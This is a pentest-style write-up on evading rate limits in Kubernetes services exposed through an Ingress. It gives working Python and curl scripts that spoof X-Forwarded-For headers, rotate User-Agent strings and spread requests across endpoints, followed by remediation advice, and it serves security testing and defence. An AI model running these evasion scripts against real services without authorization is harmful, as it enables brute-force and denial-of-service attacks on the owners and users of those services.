# Kubernetes Rate Limiting Evasion Strategies - Vulnerability Documentation

## 1. Overview

This document outlines various strategies an attacker can use to evade rate limiting mechanisms implemented in a Kubernetes environment. These evasions can allow an attacker to bypass security controls designed to protect against brute-force attacks, denial-of-service (DoS) attacks, and other malicious activities.

### Attack Vector Description

Attackers attempt to bypass rate limiting by modifying request characteristics, utilizing distributed sources, or exploiting inherent weaknesses in the rate limiting implementation itself. The goal is to maintain a high rate of requests without triggering the configured thresholds. This could target the Kubernetes API server, ingress controllers, or individual services.

### Potential Impact and Consequences

Successful rate limiting evasion can lead to:

*   **Brute-force attacks:** Circumventing protections against password guessing, API key harvesting, or token enumeration.
*   **Denial-of-Service (DoS) attacks:** Overwhelming the target service or API server, making it unavailable to legitimate users.
*   **Resource exhaustion:** Consuming excessive resources (CPU, memory, bandwidth) impacting cluster stability.
*   **Data exfiltration:** High-volume data requests that would otherwise be throttled.

### Risk Level Assessment

**High** -  Successful evasion allows attackers to bypass core security controls, enabling a wide range of malicious activities with significant potential impact.

### Technical Explanation of Why This Vulnerability Exists

Rate limiting evasion vulnerabilities arise due to:

*   **Incomplete coverage:** Rate limiting applied to only some endpoints or services.
*   **Weak identification:** Relying solely on IP addresses or user agents for identification, which are easily spoofed.
*   **Incorrect configuration:** Rate limits set too high or based on inadequate metrics.
*   **Implementation flaws:** Logic errors or bypasses in the rate limiting algorithm.
*   **Stateless firewalls or load balancers:** Load balancers can sometimes distribute requests across multiple backend services, effectively bypassing rate limits if configured per backend service only.
*   **Proxying without proper header preservation:** Proxies stripping or modifying identifying headers, such as `X-Forwarded-For`, used for rate limiting.

### Prerequisites and Conditions Needed

*   Knowledge of the Kubernetes environment and target service(s).
*   Access to a network capable of sending requests to the target.
*   Tools for crafting and sending HTTP requests (e.g., `curl`, `hey`, `ab`, Python scripts).
*   Understanding of the rate limiting mechanisms in place (if possible).  Gathering intel through enumeration of endpoints and observing response headers related to rate limiting (e.g., `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `Retry-After`).
*   Ability to use multiple IP addresses, User-Agents, or other request headers.

## 2. Validation and Exploitation Steps

The following steps demonstrate how to validate and exploit potential rate limiting evasion strategies. We assume the target is a Kubernetes service exposed via an Ingress controller. This demonstration uses `curl` for simplicity, but a tool like `hey` or `ab` would be more suited for load testing.

**Phase 1: Initial Assessment and Baseline**

**Step 1: Identify Target and Rate Limiting**

```bash
# Identify the target service and its corresponding Ingress resource.
kubectl get ingress
kubectl describe ingress <ingress_name> # Replace <ingress_name> with the actual Ingress name
```

Explanation: These commands help identify the service to target and the Ingress that manages access to it.  Review the Ingress rules to understand the exposed endpoints.

Expected Output: The `kubectl get ingress` command shows a list of Ingress resources. `kubectl describe ingress <ingress_name>` will give details about the Ingress, including the backend service and any annotations related to rate limiting (e.g., using nginx-ingress, look for annotations like `nginx.ingress.kubernetes.io/limit-rps`, `nginx.ingress.kubernetes.io/limit-burst`, `nginx.ingress.kubernetes.io/limit-connections`).

**Step 2: Baseline Testing**

```bash
# Make a few requests to the target endpoint.
curl -I http://<target_service_ip>:<target_service_port>/api/endpoint
curl -I http://<target_service_ip>:<target_service_port>/api/endpoint
curl -I http://<target_service_ip>:<target_service_port>/api/endpoint
```

Explanation:  This establishes a baseline of normal behavior before attempting to evade rate limits. The `-I` flag retrieves only the HTTP headers. Replace `<target_service_ip>` and `<target_service_port>` with the service's ClusterIP and port, respectively.  You can get the service's ClusterIP with `kubectl get svc <service_name> -n <namespace>`.  If the service is exposed via an ingress, use the ingress' external IP or DNS name.

Expected Output: Look for rate limiting headers (e.g., `X-RateLimit-Limit`, `X-RateLimit-Remaining`, `Retry-After`). Also, observe the HTTP status code. If rate limiting is active, you might see 429 (Too Many Requests).

**Step 3: Confirm Rate Limiting is in Effect**

```bash
# Send a rapid series of requests to trigger the rate limit.
for i in $(seq 1 10); do curl -I http://<target_service_ip>:<target_service_port>/api/endpoint ; done
```

Explanation: This loop sends ten requests in quick succession.  This should trigger the rate limit if it is configured correctly.

Expected Output:  After a few successful requests, subsequent requests should return a 429 status code and potentially `Retry-After` headers. This confirms rate limiting is working.

**Phase 2: Evasion Techniques**

**Strategy 1: IP Address Rotation**

**Step 4: Acquiring Multiple IP Addresses**

(This step depends on your environment. It may involve using a proxy service, VPN, or cloud provider with the ability to allocate multiple IP addresses.)

Explanation: Obtain multiple IP addresses to send requests from. This bypasses rate limits based on IP address tracking.

Expected Output: A list of valid IP addresses that can be used for making requests.

**Step 5: Rotate IP Addresses in Requests**

```python
import requests
import random

ips = ["<ip_address_1>", "<ip_address_2>", "<ip_address_3>"]  # Replace with your IP addresses
url = "http://<target_service_ip>:<target_service_port>/api/endpoint"

for _ in range(20):
    ip = random.choice(ips)
    headers = {"X-Forwarded-For": ip}  # Simulate requests coming from different IPs
    try:
        response = requests.get(url, headers=headers)
        print(f"Request from {ip}: Status Code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
```

Explanation: This Python script iterates 20 times, randomly selecting an IP address from the `ips` list and sending a request to the target URL. The `X-Forwarded-For` header is used to simulate requests originating from different IP addresses. Replace placeholders for IP addresses, the target service IP and port.

Expected Output: If successful, the script will be able to make multiple requests without triggering the rate limit. Look for HTTP status codes that are not 429. The `X-Forwarded-For` header injection may be blocked by the Ingress controller or require additional configuration to be properly handled. If the `X-Forwarded-For` is not properly processed, you are still likely hitting the rate limit.

**Alternative (using curl):**

```bash
for i in {1..20}; do
  ip=$(echo "<ip_address_1> <ip_address_2> <ip_address_3>" | awk -v n="$((RANDOM % 3 + 1))" '{print $n}')
  curl -H "X-Forwarded-For: $ip" -I http://<target_service_ip>:<target_service_port>/api/endpoint
done
```

Explanation: Similar to the Python script, this bash loop rotates through the specified IP addresses and sends requests using the `X-Forwarded-For` header.

Expected Output: If the `X-Forwarded-For` header is properly processed for rate limiting, requests will not be rate-limited. Observe the HTTP status codes for each request.

**Strategy 2: User-Agent Rotation**

**Step 6: List of User Agents**

Obtain a list of common or randomized User-Agent strings. You can find these online or generate them programmatically.

Example List:

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
```

**Step 7: Rotate User-Agent in Requests**

```python
import requests
import random

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]
url = "http://<target_service_ip>:<target_service_port>/api/endpoint"

for _ in range(20):
    user_agent = random.choice(user_agents)
    headers = {"User-Agent": user_agent}
    try:
        response = requests.get(url, headers=headers)
        print(f"Request with User-Agent {user_agent}: Status Code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
```

Explanation: This script rotates through different User-Agent strings in each request.  If the rate limiting is based solely on IP address, changing the User-Agent will bypass the rate limit.  Remember to replace the target service IP and port.

Expected Output:  If rate limiting depends solely on IP address, the requests should succeed without triggering the rate limit. Observe HTTP status codes for each request.

**Alternative (using curl):**

```bash
for i in {1..20}; do
  ua=$(echo "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" | awk -v n="$((RANDOM % 3 + 1))" '{print $n}')
  curl -H "User-Agent: $ua" -I http://<target_service_ip>:<target_service_port>/api/endpoint
done
```

**Strategy 3: Endpoint Variation/Splitting Requests Across Multiple Endpoints**

**Step 8: Identify Multiple Endpoints**

Investigate the target service for multiple related endpoints. Even if some endpoints are seemingly similar, they might be handled by separate rate limiting rules or not be subject to rate limiting at all. For example, `/api/data` and `/api/data/details`

**Step 9: Split Requests Across Endpoints**

```python
import requests
import random

endpoints = [
    "http://<target_service_ip>:<target_service_port>/api/endpoint",
    "http://<target_service_ip>:<target_service_port>/api/data",
    "http://<target_service_ip>:<target_service_port>/api/data/details"
]

for _ in range(30):
    url = random.choice(endpoints)
    try:
        response = requests.get(url)
        print(f"Request to {url}: Status Code {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
```

Explanation:  This script randomly selects from a list of endpoints to make requests. This can avoid rate limiting if rate limits are specific to a single endpoint.

Expected Output: Successful requests to all endpoints without triggering rate limits on any single one.

**Phase 3: Exploitation and Reporting**

**Step 10: Document Successful Evasion Methods**

Record the specific techniques that successfully evaded the rate limiting mechanisms.  Include detailed configuration information, scripts, and observed behavior.

**Step 11: Assess Impact**

Based on the successful evasions, assess the potential impact on the system. This includes the ability to brute-force credentials, launch DoS attacks, or perform other malicious activities.

**Step 12: Report Vulnerability**

Create a detailed report outlining the vulnerability, the steps to reproduce it, the potential impact, and recommended remediation strategies.

## Remediation Recommendations

*   **Comprehensive Rate Limiting:** Apply rate limiting to all critical endpoints and services.
*   **Robust Identification:** Use a combination of IP addresses, User-Agents, API keys, and authentication tokens for accurate identification. Consider request fingerprinting techniques.
*   **Adaptive Rate Limiting:** Implement adaptive rate limiting algorithms that adjust thresholds based on real-time traffic patterns and anomaly detection.
*   **Proper Header Handling:** Ensure that proxies and load balancers correctly forward and preserve relevant request headers (e.g., `X-Forwarded-For`). Configure the Ingress controller accordingly.  The Nginx Ingress controller, for example, might require the `--set-real-ip-from` flag on the controller to properly use the X-Forwarded-For header.
*   **WAF (Web Application Firewall):**  Implement a WAF to detect and block malicious traffic patterns, including attempts to evade rate limiting.
*   **Logging and Monitoring:**  Enable comprehensive logging and monitoring to detect suspicious activity and potential rate limiting bypasses.
*   **Regular Testing:**  Conduct regular penetration testing and vulnerability assessments to identify and address potential rate limiting evasion vulnerabilities.
*   **Service Mesh:** Employ a service mesh (e.g., Istio) for advanced traffic management and rate limiting capabilities at the service-to-service level.
*   **Review and Audit:** Periodically review and audit rate limiting configurations to ensure they are effective and up-to-date.
